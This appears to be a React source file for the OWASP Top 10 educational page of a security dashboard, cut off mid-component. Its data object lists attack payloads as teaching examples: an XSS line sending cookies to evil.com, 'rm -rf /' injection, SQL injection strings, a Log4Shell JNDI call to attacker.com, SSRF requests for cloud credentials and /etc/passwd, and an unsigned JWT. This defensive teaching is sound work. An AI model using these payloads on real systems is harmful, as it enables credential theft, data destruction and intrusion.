import React, { useEffect, useState } from 'react';
import { findingsAPI } from '../services/api';
import { SevBadge } from '../components/shared/UI';
import { OWASP_MAP } from '../types';
import type { Finding } from '../types';
import { Bar } from 'react-chartjs-2';
import { Chart as ChartJS, CategoryScale, LinearScale, BarElement, Tooltip } from 'chart.js';
import { X, ChevronDown, ChevronUp, Shield, AlertTriangle, Wrench, BookOpen, Code } from 'lucide-react';
ChartJS.register(CategoryScale, LinearScale, BarElement, Tooltip);

// ── Full educational data for each OWASP category ──────────────
const OWASP_DETAIL: Record<string, {
  fullName: string; severity: string; severityColor: string;
  what: string; why: string; impact: string;
  examples: string[]; payloads: string[]; prevention: string[];
  bestPractices: string[]; detection: string[]; tools: string[];
  remediation: string[]; secureCoding: string[]; scenario: string;
}> = {
  A01: {
    fullName: 'A01:2021 – Broken Access Control',
    severity: 'Critical', severityColor: '#EF4444',
    what: 'Broken Access Control happens when users can act outside of their intended permissions. This means a normal user can access admin pages, view other users\' data, or modify records they don\'t own.',
    why: 'It happens because developers often implement access checks inconsistently — checking permissions on some routes but forgetting others, relying only on hidden UI elements instead of server-side checks, or trusting user-supplied IDs without verifying ownership.',
    impact: 'Attackers can read, modify, or delete other users\' data, access admin functionality, escalate privileges, and take full control of the application.',
    examples: [
      'Changing ?userId=123 to ?userId=124 to view another user\'s profile',
      'Accessing /admin/dashboard without admin role',
      'Modifying a POST body to change order owner ID to another user',
      'Forcing browsing to /api/users/all when you\'re not an admin',
    ],
    payloads: [
      'GET /api/users/2 (when logged in as user 1)',
      'GET /admin/settings (as regular user)',
      'PUT /api/orders/456 {"owner_id": 999}',
      'DELETE /api/documents/789 (owned by another user)',
    ],
    prevention: [
      'Enforce access control checks on every server-side request',
      'Deny by default — only grant explicit permissions',
      'Use role-based access control (RBAC) consistently',
      'Log and alert on access control failures',
      'Invalidate JWT tokens server-side on logout',
    ],
    bestPractices: [
      'Apply principle of least privilege to all user accounts',
      'Never trust client-side data for authorization decisions',
      'Use centralized authorization middleware',
      'Test access control with automated tools and manual pen testing',
    ],
    detection: [
      'Automated scanning for IDOR (Insecure Direct Object Reference)',
      'Manual testing with different user accounts',
      'Forced browsing attacks against known paths',
      'Reviewing server logs for unauthorized access attempts',
    ],
    tools: ['Burp Suite (IDOR scanning)', 'OWASP ZAP', 'Autorize (Burp extension)', 'Postman (manual testing)'],
    remediation: [
      '1. Add server-side authorization checks to every endpoint',
      '2. Verify resource ownership before any CRUD operation',
      '3. Implement JWT claims validation for role enforcement',
      '4. Add audit logging for all access control decisions',
      '5. Run automated IDOR scanning in CI/CD pipeline',
    ],
    secureCoding: [
      'Always verify: Does this user own this resource?',
      'Use UUIDs instead of sequential IDs to reduce IDOR risk',
      'Never expose internal database IDs in URLs if avoidable',
      'Use middleware to enforce roles before reaching route handler',
    ],
    scenario: 'A school portal stores student records at /api/students/1, /api/students/2 etc. A student changes their ID in the URL from 1 to 2 and sees another student\'s grades and personal information — a classic IDOR vulnerability.',
  },
  A02: {
    fullName: 'A02:2021 – Cryptographic Failures',
    severity: 'High', severityColor: '#F97316',
    what: 'Cryptographic Failures (formerly "Sensitive Data Exposure") occur when an application fails to properly protect sensitive data using cryptography. This includes storing passwords in plain text, using weak encryption algorithms, transmitting data over HTTP instead of HTTPS, or exposing encryption keys.',
    why: 'Developers often use outdated algorithms (MD5, SHA1), forget to encrypt data at rest, misconfigure TLS, hardcode secrets in source code, or use short/predictable encryption keys.',
    impact: 'Attackers can steal passwords, credit card numbers, personal health records, and other sensitive data. Compromised encryption can lead to identity theft, financial fraud, and regulatory violations (GDPR, PCI DSS).',
    examples: [
      'Passwords stored as plain text or MD5 hashes in the database',
      'Website served over HTTP allowing network interception',
      'Session tokens transmitted in URLs (visible in server logs)',
      'Secret keys hardcoded in source code pushed to GitHub',
    ],
    payloads: [
      'Intercepting HTTP traffic with Wireshark on open WiFi',
      'Dumping database to find plain text passwords',
      'Searching GitHub for "password=" or "api_key=" in commits',
      'Checking server response headers for TLS downgrade opportunities',
    ],
    prevention: [
      'Use HTTPS everywhere (enforce HSTS header)',
      'Hash passwords with bcrypt, Argon2, or scrypt (not MD5/SHA1)',
      'Encrypt sensitive data at rest using AES-256',
      'Never store secrets in source code — use environment variables',
      'Disable caching for pages containing sensitive data',
    ],
    bestPractices: [
      'Use TLS 1.2 or higher — disable older versions',
      'Set HSTS header: Strict-Transport-Security: max-age=31536000',
      'Rotate encryption keys regularly',
      'Use parameterised encryption with authenticated encryption (AES-GCM)',
    ],
    detection: [
      'Check response headers for HTTPS enforcement',
      'Look for sensitive data in server logs and error messages',
      'Audit database schema for unencrypted sensitive fields',
      'Scan source code repositories for hardcoded credentials',
    ],
    tools: ['SSL Labs (TLS analysis)', 'GitLeaks (secret scanning)', 'Wireshark (traffic analysis)', 'HashCat (password cracking testing)'],
    remediation: [
      '1. Force HTTPS with 301 redirects and HSTS header',
      '2. Replace MD5/SHA1 with bcrypt for password hashing',
      '3. Move all secrets to environment variables or a vault',
      '4. Encrypt PII fields at the database level',
      '5. Add Secrets scanning to CI/CD pipeline',
    ],
    secureCoding: [
      'Never use MD5 or SHA1 for security purposes',
      'Always use bcrypt with cost factor ≥ 12 for passwords',
      'Store private keys outside the web root',
      'Use os.urandom() or secrets module for token generation',
    ],
    scenario: 'A healthcare app stores patient records with passwords hashed as MD5. An attacker breaches the database, cracks 80% of passwords in 2 hours using rainbow tables, and accesses thousands of patient health records.',
  },
  A03: {
    fullName: 'A03:2021 – Injection',
    severity: 'Critical', severityColor: '#EF4444',
    what: 'Injection flaws occur when untrusted data is sent to an interpreter (SQL, OS shell, LDAP, etc.) as part of a command or query. The attacker\'s hostile data can trick the interpreter into executing unintended commands or accessing data without authorization.',
    why: 'Injection happens when user input is directly concatenated into queries or commands without proper sanitisation or parameterisation. Developers often trust input that comes from the client, not realising it can be manipulated.',
    impact: 'SQL Injection can lead to complete database compromise, data theft, data deletion, and authentication bypass. XSS can steal session cookies, redirect users to malicious sites, and execute arbitrary JavaScript in victims\' browsers.',
    examples: [
      'SQL: username = \' OR \'1\'=\'1 bypasses login',
      'XSS: <script>document.location=\'http://evil.com/?c=\'+document.cookie</script>',
      'SSTI: {{7*7}} evaluating to 49 in a Jinja2 template',
      'OS Command: ; rm -rf / injected into a filename parameter',
    ],
    payloads: [
      'SQLi: \' OR 1=1--',
      'SQLi Boolean: \' AND 1=2--',
      'XSS Reflected: <vaptxss>',
      'SSTI: {{config.items()}}',
      'SQLi UNION: \' UNION SELECT null,username,password FROM users--',
    ],
    prevention: [
      'Use parameterised queries / prepared statements for all database queries',
      'Use an ORM that handles escaping automatically',
      'HTML-encode all user output to prevent XSS',
      'Implement a strict Content Security Policy (CSP)',
      'Validate and whitelist input on the server side',
    ],
    bestPractices: [
      'Never concatenate user input into SQL strings',
      'Use allowlists not denylists for input validation',
      'Apply output encoding specific to the context (HTML, JS, URL)',
      'Enable WAF rules for known injection patterns',
    ],
    detection: [
      'Send single quote (\') and observe database errors',
      'Boolean-based blind: compare responses for AND 1=1 vs AND 1=2',
      'XSS: inject <script>alert(1)</script> and check for reflection',
      'SSTI: inject {{7*7}} and check if response contains 49',
    ],
    tools: ['SQLMap (automated SQLi)', 'OWASP ZAP (XSS scanning)', 'Burp Suite (manual injection)', 'DOMPurify (XSS prevention library)'],
    remediation: [
      '1. Replace all dynamic SQL with parameterised queries immediately',
      '2. Add HTML escaping to all template output variables',
      '3. Implement CSP header: Content-Security-Policy: default-src \'self\'',
      '4. Deploy WAF with injection rulesets',
      '5. Run SQLMap and ZAP in your CI/CD pipeline',
    ],
    secureCoding: [
      'Python: cursor.execute("SELECT * FROM users WHERE id=?", (user_id,))',
      'JS: db.query("SELECT * FROM users WHERE id = $1", [userId])',
      'React: Use textContent not innerHTML for user data',
      'Never pass user input to eval(), setTimeout(), or innerHTML',
    ],
    scenario: 'A login form sends username directly into a SQL query. An attacker enters admin\'\'-- as username. The SQL becomes SELECT * FROM users WHERE username=\'admin\'-- AND password=\'...\' — the -- comments out the password check, granting full admin access.',
  },
  A04: {
    fullName: 'A04:2021 – Insecure Design',
    severity: 'High', severityColor: '#F97316',
    what: 'Insecure Design refers to missing or ineffective security controls at the design and architecture level. Unlike implementation bugs, these are fundamental flaws in how the system was conceptualized — the security was not considered from the beginning.',
    why: 'Teams prioritise features over security during the design phase, skip threat modelling, and do not apply security design patterns. Business logic flaws are created when workflows do not anticipate malicious users.',
    impact: 'Design flaws can be very difficult to fix after implementation. They can expose business logic flaws that bypass security controls, allow privilege escalation, and create attack paths that code-level fixes cannot address.',
    examples: [
      'Password reset that allows guessing OTPs by brute force (no rate limiting)',
      'Cinema booking that doesn\'t validate if a seat is already taken server-side',
      'Free trial that can be started unlimited times with different emails',
      'Admin panel accessible without rate limiting on login',
    ],
    payloads: [
      'Rapid POST requests to /auth/login testing all 4-digit PINs (0000–9999)',
      'Registering multiple accounts with similar emails: test+1@mail.com, test+2@mail.com',
      'Buying a product and manipulating quantity to -1 to get a refund',
    ],
    prevention: [
      'Conduct threat modelling during the design phase',
      'Apply security design patterns (defense in depth, fail secure)',
      'Implement rate limiting on all sensitive operations',
      'Validate business logic on the server side, never just the client',
      'Require design review with security team before implementation',
    ],
    bestPractices: [
      'Use the STRIDE threat modelling framework',
      'Apply principle of least privilege at the design level',
      'Design for failure — what happens if this control is bypassed?',
      'Separate sensitive operations into distinct services',
    ],
    detection: [
      'Manual review of application workflows for logic flaws',
      'Threat modelling sessions with security architects',
      'Testing rate limiting on login, OTP, and reset endpoints',
      'Business logic testing: negative quantities, excessive requests',
    ],
    tools: ['OWASP Threat Dragon (threat modelling)', 'Burp Suite (manual testing)', 'Postman (API workflow testing)'],
    remediation: [
      '1. Add rate limiting to all authentication and OTP endpoints',
      '2. Implement account lockout after N failed attempts',
      '3. Add server-side validation for all business rules',
      '4. Conduct a threat modelling session for existing features',
      '5. Add CAPTCHA after 3 failed login attempts',
    ],
    secureCoding: [
      'Design every feature assuming the user is adversarial',
      'Never rely on UI controls as the only security enforcement',
      'Implement idempotency checks to prevent duplicate transactions',
      'Add expiry to all one-time tokens and actions',
    ],
    scenario: 'A banking app allows password reset via a 4-digit SMS OTP but has no rate limiting. An attacker scripts 10,000 requests trying all combinations 0000–9999 and resets the target\'s password in minutes.',
  },
  A05: {
    fullName: 'A05:2021 – Security Misconfiguration',
    severity: 'High', severityColor: '#F97316',
    what: 'Security Misconfiguration is the most common vulnerability. It occurs when security settings are not properly defined, implemented, or maintained — including missing security headers, default credentials, verbose error messages, open cloud storage buckets, or enabled debug features in production.',
    why: 'It happens because configurations are complex, default settings are often insecure, developers focus on functionality not hardening, and configuration drift occurs between environments.',
    impact: 'Attackers can gain unauthorized access through default credentials, extract system information from error messages, exploit unnecessary features or services, or access sensitive files through directory listing.',
    examples: [
      'Default admin/admin credentials not changed',
      'Detailed stack traces shown to users in production',
      'Directory listing enabled on web server',
      'Missing X-Frame-Options allowing clickjacking',
      'AWS S3 bucket set to public with sensitive files',
    ],
    payloads: [
      'GET /phpinfo.php (looking for server configuration)',
      'GET /.git/ (exposed version control directory)',
      'GET /admin using default credentials admin:admin',
      'Checking for missing headers: curl -I https://target.com',
    ],
    prevention: [
      'Implement a security hardening checklist for all environments',
      'Set all required security headers (CSP, HSTS, X-Frame-Options)',
      'Disable debug mode and stack traces in production',
      'Change all default credentials immediately after installation',
      'Regular security configuration audits',
    ],
    bestPractices: [
      'Use infrastructure-as-code to enforce consistent configurations',
      'Apply CIS Benchmarks for your web server and OS',
      'Regularly scan for exposed sensitive files and directories',
      'Implement automated security header validation in CI/CD',
    ],
    detection: [
      'Security header scan: securityheaders.com',
      'Check for exposed sensitive paths (/.git, /.env, /phpinfo.php)',
      'Test default credentials on all admin interfaces',
      'Review cloud storage permissions for public buckets',
    ],
    tools: ['Mozilla Observatory', 'Nikto (web server scanner)', 'Nessus (configuration audit)', 'ScoutSuite (cloud misconfiguration)'],
    remediation: [
      '1. Add all security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options',
      '2. Disable directory listing in web server config',
      '3. Remove phpinfo.php and other diagnostic files from production',
      '4. Set NODE_ENV=production / FLASK_ENV=production',
      '5. Run Nikto scan and fix all reported issues',
    ],
    secureCoding: [
      'Nginx: add_header X-Frame-Options "SAMEORIGIN" always;',
      'Nginx: add_header Content-Security-Policy "default-src \'self\'" always;',
      'Express: use helmet() middleware for automatic security headers',
      'Never commit .env files to version control',
    ],
    scenario: 'A developer accidentally pushes a .env file containing database credentials and API keys to a public GitHub repository. Within minutes, bots scanning GitHub find the credentials and use them to access the production database.',
  },
  A06: {
    fullName: 'A06:2021 – Vulnerable and Outdated Components',
    severity: 'Medium', severityColor: '#EAB308',
    what: 'This vulnerability occurs when applications use components (libraries, frameworks, packages) with known security vulnerabilities, or versions that are no longer maintained. If one component is vulnerable, the entire application may be at risk.',
    why: 'Developers don\'t track which versions they\'re using, forget to update dependencies, avoid updates to prevent breaking changes, or use libraries from untrusted sources.',
    impact: 'Known CVEs can be directly exploited using public exploit code. A single vulnerable library can expose critical functionality even if the application code itself is well-written.',
    examples: [
      'Using jQuery 1.x with known XSS vulnerabilities (CVE-2020-11022)',
      'Old version of Log4j with Log4Shell (CVE-2021-44228)',
      'Outdated Apache Struts exploited in Equifax breach',
      'npm package with a typosquatted malicious version',
    ],
    payloads: [
      '${jndi:ldap://attacker.com/exploit} in any header (Log4Shell)',
      'Checking npm packages: npm audit',
      'pip check for Python dependencies',
      'Searching NVD/CVE database for installed package versions',
    ],
    prevention: [
      'Continuously monitor dependencies for known vulnerabilities',
      'Use automated tools to flag vulnerable packages in CI/CD',
      'Remove unused dependencies',
      'Only download packages from official/trusted sources',
      'Subscribe to security advisories for your key components',
    ],
    bestPractices: [
      'Use Dependabot or Renovate to automate dependency updates',
      'Pin dependency versions in production, update regularly in dev',
      'Review package.json / requirements.txt regularly',
      'Use npm audit fix or pip-audit after every install',
    ],
    detection: [
      'npm audit — checks for known vulnerabilities',
      'pip-audit — Python dependency vulnerability scanner',
      'OWASP Dependency-Check — language agnostic scanner',
      'Snyk — continuous monitoring service',
    ],
    tools: ['Snyk', 'OWASP Dependency-Check', 'npm audit', 'pip-audit', 'GitHub Dependabot'],
    remediation: [
      '1. Run npm audit / pip-audit and fix all critical/high issues',
      '2. Update all dependencies to latest stable versions',
      '3. Remove unused packages',
      '4. Add automated vulnerability scanning to CI/CD',
      '5. Set up Dependabot alerts on GitHub repository',
    ],
    secureCoding: [
      'npm: add "npm audit" to your CI/CD pipeline as a required step',
      'Python: use pip-audit in requirements and lock versions',
      'Lock files (package-lock.json, Pipfile.lock) prevent unexpected updates',
      'Prefer widely-used packages with active security maintenance',
    ],
    scenario: 'A company\'s application uses Log4j 2.14. When the Log4Shell vulnerability (CVE-2021-44228) is disclosed, attackers send ${jndi:ldap://attacker.com/exploit} in a username field. The vulnerable Log4j version processes this, connects to the attacker\'s server, and executes malicious code — all because of one unpatched library.',
  },
  A07: {
    fullName: 'A07:2021 – Identification and Authentication Failures',
    severity: 'High', severityColor: '#F97316',
    what: 'Authentication failures occur when an application improperly implements identity verification and session management. This allows attackers to steal passwords, session tokens, or assume other users\' identities.',
    why: 'Weak password policies, missing brute-force protection, insecure session token generation, improper logout, and credential stuffing vulnerabilities are all common causes.',
    impact: 'Account takeover, unauthorized access to sensitive data, privilege escalation, financial fraud, and reputation damage.',
    examples: [
      'No rate limiting on login — allows brute-force attacks',
      'JWT tokens that never expire (no exp claim)',
      'Weak session IDs that can be guessed',
      'Passwords transmitted in GET parameters in URLs',
      'Sessions not invalidated server-side on logout',
    ],
    payloads: [
      'JWT with alg:none: eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.',
      'Session fixation: Set cookie to a known value before login',
      'Credential stuffing with leaked password lists',
      'Brute force: 100 requests/second on /api/auth/login',
    ],
    prevention: [
      'Implement multi-factor authentication (MFA)',
      'Rate limit login attempts — lockout after 5 failures',
      'Use secure, random session token generation',
      'Set JWT expiry and validate server-side',
      'Invalidate sessions on logout and password change',
    ],
    bestPractices: [
      'Enforce strong password policies (min 12 chars, mixed)',
      'Store passwords with bcrypt cost factor ≥ 12',
      'Implement CAPTCHA after repeated failures',
      'Check passwords against known breach databases (HaveIBeenPwned)',
    ],
    detection: [
      'Test for missing rate limiting on /login endpoint',
      'Decode JWT header to check for alg:none vulnerability',
      'Test session persistence after logout',
      'Check cookie flags: HttpOnly, Secure, SameSite',
    ],
    tools: ['Hydra (brute force testing)', 'jwt_tool (JWT analysis)', 'Burp Suite (session analysis)', 'HaveIBeenPwned API'],
    remediation: [
      '1. Add rate limiting: max 5 login attempts per IP per 10 minutes',
      '2. Implement account lockout with exponential backoff',
      '3. Set JWT exp claim and validate on every request',
      '4. Set cookies with HttpOnly; Secure; SameSite=Strict',
      '5. Invalidate server-side sessions on logout',
    ],
    secureCoding: [
      'Never store sessions in localStorage — use HttpOnly cookies',
      'Always validate JWT signature on the server — never trust client-side decoding',
      'Use Python secrets module for token generation, not random',
      'Implement PBKDF2/bcrypt/Argon2 — never MD5 or SHA1 for passwords',
    ],
    scenario: 'An e-commerce site has no rate limiting on its login page. An attacker uses a credential stuffing tool with 1 million email/password pairs from previous breaches. The tool runs overnight and compromises 3,000 accounts because users reused passwords from other breached services.',
  },
  A08: {
    fullName: 'A08:2021 – Software and Data Integrity Failures',
    severity: 'High', severityColor: '#F97316',
    what: 'Integrity failures occur when code and infrastructure does not protect against integrity violations — including unsigned software updates, loading external scripts without SRI (Subresource Integrity), or deserializing untrusted data without verification.',
    why: 'Developers trust external sources (CDNs, package registries, update servers) without verifying integrity, use insecure deserialization, or allow CI/CD pipelines to execute without proper security controls.',
    impact: 'Supply chain attacks can compromise thousands of applications at once. Insecure deserialization can lead to remote code execution. Malicious CDN content can affect every visitor of a website.',
    examples: [
      'Loading jQuery from CDN without an integrity hash',
      'Auto-updating npm packages without auditing changes (supply chain)',
      'Python pickle deserialization from user input',
      'SolarWinds attack: malicious update distributed to thousands of customers',
    ],
    payloads: [
      '<script src="https://cdn.example.com/lib.js"> (no integrity attribute)',
      'Python pickle exploit: import pickle; pickle.loads(user_input)',
      'npm install compromised-package@latest',
    ],
    prevention: [
      'Add Subresource Integrity (SRI) hashes to all external scripts',
      'Verify digital signatures on software updates',
      'Never deserialize untrusted data',
      'Use lock files to pin dependency versions',
      'Review all CI/CD pipeline configurations for injection risks',
    ],
    bestPractices: [
      'Host critical JavaScript on your own CDN rather than third-party',
      'Implement package signature verification',
      'Use JSON instead of serialization formats like pickle or Java serialization',
      'Scan CI/CD pipelines for supply chain vulnerabilities',
    ],
    detection: [
      'Check HTML source for external scripts missing integrity attribute',
      'Audit CI/CD pipeline for unsigned artifacts',
      'Review update mechanisms for signature verification',
    ],
    tools: ['SRI Hash Generator (srihash.org)', 'Snyk (supply chain scanning)', 'OWASP Dependency-Check', 'GitHub Code Scanning'],
    remediation: [
      '1. Add integrity and crossorigin attributes to all CDN scripts',
      '2. Generate SRI hashes: openssl dgst -sha384 -binary script.js | openssl base64 -A',
      '3. Replace pickle/Java serialization with JSON',
      '4. Lock all dependency versions in package-lock.json/Pipfile.lock',
      '5. Add secret scanning and integrity checks to CI/CD',
    ],
    secureCoding: [
      '<script src="https://cdn/lib.js" integrity="sha384-..." crossorigin="anonymous">',
      'Never use pickle.loads() on user-supplied data',
      'Use hmac.compare_digest() for timing-safe comparison',
      'Verify checksums of downloaded files before installation',
    ],
    scenario: 'A popular npm package is compromised when its maintainer\'s account is phished. The attacker publishes a malicious version that exfiltrates environment variables. Thousands of apps auto-update and their database credentials are stolen before anyone notices.',
  },
  A09: {
    fullName: 'A09:2021 – Security Logging and Monitoring Failures',
    severity: 'Medium', severityColor: '#EAB308',
    what: 'Without adequate logging, monitoring, and alerting, breaches go undetected. Security Logging failures mean that attacks can persist for months — the average time to detect a breach is 197 days. Attackers rely on the lack of monitoring to cover their tracks.',
    why: 'Logging is often seen as an operational concern, not a security one. Teams log application errors but not security events. Alert thresholds are not configured, and logs are not reviewed regularly.',
    impact: 'Ongoing attacks go undetected, allowing attackers to pivot, escalate privileges, and exfiltrate large amounts of data before discovery. Forensic investigation becomes impossible without logs.',
    examples: [
      'Failed login attempts not logged — brute force goes undetected',
      'SQL injection errors swallowed silently with no alert',
      'Admin account created at 3 AM — no alert triggered',
      'Logs stored locally where attacker can delete them',
    ],
    payloads: [
      'Sending 10,000 login attempts and checking if any alert fires',
      'Accessing /admin/debug and checking if access is logged',
      'Deleting /var/log/app.log after compromise',
    ],
    prevention: [
      'Log all authentication events (login success, failure, logout)',
      'Log all access control failures and authorization errors',
      'Set up real-time alerting for suspicious patterns',
      'Store logs in a centralized, tamper-proof system (SIEM)',
      'Include context in logs: user ID, IP, timestamp, resource accessed',
    ],
    bestPractices: [
      'Log at appropriate levels — not too noisy, not too quiet',
      'Never log sensitive data (passwords, tokens, PII)',
      'Set up automated alerts for: multiple failed logins, privilege escalation, off-hours admin access',
      'Retain logs for minimum 90 days (longer for compliance)',
    ],
    detection: [
      'Verify that failed login attempts appear in logs',
      'Check if access control violations generate alerts',
      'Confirm logs are stored externally and cannot be deleted by app',
      'Test alert thresholds by simulating attack patterns',
    ],
    tools: ['ELK Stack (Elasticsearch, Logstash, Kibana)', 'Splunk', 'Graylog', 'AWS CloudTrail', 'Datadog Security'],
    remediation: [
      '1. Add structured logging to all authentication events',
      '2. Set up SIEM alerts for ≥ 5 failed logins in 5 minutes from same IP',
      '3. Log all 4xx and 5xx responses with user context',
      '4. Ship logs to external system (CloudWatch, Splunk, ELK)',
      '5. Create a runbook for responding to security alerts',
    ],
    secureCoding: [
      'Log format: {"timestamp":"...", "level":"WARN", "event":"LOGIN_FAILED", "ip":"...", "user":"..."}',
      'Never include passwords or tokens in log messages',
      'Use structured logging (JSON) not free-text for easy parsing',
      'Python: import logging; logger.warning("LOGIN_FAILED", extra={"ip": ip, "user": email})',
    ],
    scenario: 'An attacker gains access to an employee account on Monday and spends a week quietly exfiltrating customer data. Because the company has no security monitoring, the breach is only discovered 6 months later when the stolen data appears for sale online.',
  },
  A10: {
    fullName: 'A10:2021 – Server-Side Request Forgery (SSRF)',
    severity: 'High', severityColor: '#F97316',
    what: 'SSRF occurs when an attacker can make the server send HTTP requests to an arbitrary destination. The server becomes a proxy that the attacker controls, allowing them to reach internal services, cloud metadata endpoints, and other systems that should not be publicly accessible.',
    why: 'Applications fetch remote resources (images, feeds, webhooks) based on user-supplied URLs without proper validation, allowing attackers to redirect these requests to internal infrastructure.',
    impact: 'Attackers can scan internal networks, access cloud provider metadata (AWS credentials via 169.254.169.254), access internal admin panels, read local files via file:// protocol, and in some cases achieve Remote Code Execution.',
    examples: [
      'Webhook URL parameter pointing to http://169.254.169.254/latest/meta-data/',
      'Image download feature fetching http://internal-admin.corp:8080/',
      'URL preview feature accessing file:///etc/passwd',
      'PDF generator fetching http://localhost:6379/ (Redis without auth)',
    ],
    payloads: [
      'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'url=http://localhost:8080/admin',
      'url=http://192.168.1.1/ (internal router)',
      'url=file:///etc/passwd',
      'url=http://0.0.0.0:22/ (SSH port check)',
    ],
    prevention: [
      'Validate and sanitise all user-supplied URLs',
      'Use an allowlist of permitted domains/IPs',
      'Block requests to private IP ranges (10.x, 172.16.x, 192.168.x, 127.x)',
      'Disable URL schemas other than http/https',
      'Run fetching service in a network-isolated sandbox',
    ],
    bestPractices: [
      'Never fetch user-supplied URLs from your backend without allowlisting',
      'Use a dedicated microservice for URL fetching with strict network rules',
      'Block cloud metadata IP 169.254.169.254 at the network level',
      'Return generic error messages — don\'t reveal if internal host exists',
    ],
    detection: [
      'Test by submitting http://127.0.0.1/ as a URL parameter',
      'Try cloud metadata endpoint: http://169.254.169.254/latest/meta-data/',
      'Use Burp Collaborator to detect out-of-band SSRF',
      'Check for SSRF-prone parameters: url=, path=, redirect=, next=, dest=',
    ],
    tools: ['Burp Suite (Collaborator for SSRF)', 'SSRFire', 'OWASP ZAP', 'interactsh (for blind SSRF detection)'],
    remediation: [
      '1. Implement URL allowlist — only fetch from approved domains',
      '2. Block RFC 1918 private IP ranges in firewall rules',
      '3. Block 169.254.169.254 at network level (cloud metadata)',
      '4. Use DNS resolution and re-validate IP before request',
      '5. Add network egress filtering for backend services',
    ],
    secureCoding: [
      'Python: Parse URL, check hostname against allowlist before fetching',
      'Block redirects that lead to private IPs (check each redirect step)',
      'Use socket.getaddrinfo() to resolve and validate the final IP',
      'Implement a dedicated URL validation function that checks scheme, host, and port',
    ],
    scenario: 'A web app allows users to add a webhook URL for notifications. An attacker sets the webhook URL to http://169.254.169.254/latest/meta-data/iam/security-credentials/. The server fetches this URL, returns the AWS temporary credentials in the response, and the attacker uses these to access the company\'s entire AWS infrastructure.',
  },
};

export default function OWASPPage() {
  const [findings, setFindings]   = useState<Finding[]>([]);
  const [selected, setSelected]   = useState<string | null>(null);
  const [detailTab, setDetailTab] = useState<'overview' | 'technical' | 'findings'>('overview');

  useEffect(() => {
    findingsAPI.list({}).then(r => setFindings(r.data.findings ?? [])).catch(() => {});
  }, []);

  const byOwasp = Object.keys(OWASP_MAP).map(code => ({
    code,
    name: OWASP_MAP[code],
    findings: findings.filter(f => f.owasp_category === code),
  }));

  const barData = {
    labels: byOwasp.map(o => o.code),
    datasets: [
      { label: 'Critical', data: byOwasp.map(o => o.findings.filter(f => f.severity === 'critical').length), backgroundColor: '#EF4444' },
      { label: 'High',     data: byOwasp.map(o => o.findings.filter(f => f.severity === 'high').length),     backgroundColor: '#F97316' },
      { label: 'Medium',   data: byOwasp.map(o => o.findings.filter(f => f.severity === 'medium').length),   backgroundColor: '#EAB308' },
      { label: 'Low',      data: byOwasp.map(o => o.findings.filter(f => f.severity === 'low').length),      backgroundColor: '#22C55E' },
    ],
  };
  const barOpts: any = {
    responsive: true, maintainAspectRatio: false,
    plugins: { legend: { display: false } },
    scales: {
      x: { stacked: true, grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#94A3B8', font: { size: 11 } } },
      y: { stacked: true, grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#94A3B8', font: { size: 11 } }, beginAtZero: true },
    },
  };

  const selectedOwasp  = selected ? byOwasp.find(o => o.code === selected) : null;
  const selectedDetail = selected ? OWASP_DETAIL[selected] : null;

  const handleSelect = (code: string) => {
    if (selected === code) { setSelected(null); return; }
    setSelected(code);
    setDetailTab('overview');
  };

  return (
    <div className="fade-up" style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
      <div>
        <h1 style={{ fontSize: 20, fontWeight: 800, color: 'var(--text)' }}>OWASP Top 10 Coverage</h1>
        <p style={{ fontSize: 12, color: 'var(--text3)', marginTop: 2 }}>
          Click any category for a detailed educational breakdown
        </p>
      </div>

      {/* Bar Chart */}
      <div className="card">
        <p className="card-title">Findings by OWASP Category</p>
        <div style={{ height: 220, position: 'relative' }}>
          <Bar data={barData} options={barOpts} />
        </div>
      </div>

      {/* Grid of OWASP cards */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5,1fr)', gap: 10 }}>
        {byOwasp.map(({ code, name, findings: fs }) => {
          const hasCrit    = fs.some(f => f.severity === 'critical');
          const hasHigh    = fs.some(f => f.severity === 'high');
          const isSelected = selected === code;
          const borderColor = isSelected ? 'var(--accent)'
            : hasCrit ? 'rgba(239,68,68,0.5)' : hasHigh ? 'rgba(249,115,22,0.4)'
            : fs.length ? 'rgba(234,179,8,0.3)' : 'var(--border)';
          const bg = isSelected ? 'rgba(59,130,246,0.08)'
            : hasCrit ? 'rgba(239,68,68,0.05)' : hasHigh ? 'rgba(249,115,22,0.04)'
            : fs.length ? 'rgba(234,179,8,0.03)' : 'var(--surface2)';

          return (
            <div key={code} onClick={() => handleSelect(code)}
              style={{
                background: bg, border: `1px solid ${borderColor}`, borderRadius: 10,
                padding: 14, cursor: 'pointer', transition: 'all 0.18s',
                outline: isSelected ? `2px solid var(--accent)` : 'none',
                transform: isSelected ? 'scale(1.02)' : 'scale(1)',
              }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                <p style={{ fontFamily: 'monospace', fontSize: 10, color: 'var(--text3)', marginBottom: 4 }}>{code}</p>
                {isSelected ? <ChevronUp size={12} style={{ color: 'var(--accent)' }} /> : <ChevronDown size={12} style={{ color: 'var(--text3)' }} />}
              </div>
              <p style={{ fontSize: 11, fontWeight: 700, color: 'var(--text)', lineHeight: 1.35, marginBottom: 8 }}>{name}</p>
              <p style={{ fontFamily: 'monospace', fontSize: 13, fontWeight: 700,
                color: hasCrit ? '#EF4444' : hasHigh ? '#F97316' : fs.length ? '#EAB308' : 'var(--text3)' }}>
                {fs.length} finding{fs.length !== 1 ? 's' : ''}
              </p>
              <div style={{ height: 4, background: 'rgba(255,255,255,0.06)', borderRadius: 2, marginTop: 8, overflow: 'hidden' }}>
                <div style={{ height: '100%', borderRadius: 2, width: `${Math.min(100, fs.length * 12)}%`,
                  background: hasCrit ? '#EF4444' : hasHigh ? '#F97316' : fs.length ? '#EAB308' : 'transparent' }} />
              </div>
            </div>
          );
        })}
      </div>

      {/* ── Detail Panel ── */}
      {selected && selectedOwasp && selectedDetail && (
        <div className="card fade-up" style={{ border: '1px solid var(--accent)', overflow: 'hidden' }}>

          {/* Header */}
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            marginBottom: 0, paddingBottom: 14, borderBottom: '1px solid var(--border)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <div style={{ background: 'rgba(59,130,246,0.12)', border: '1px solid rgba(59,130,246,0.3)',
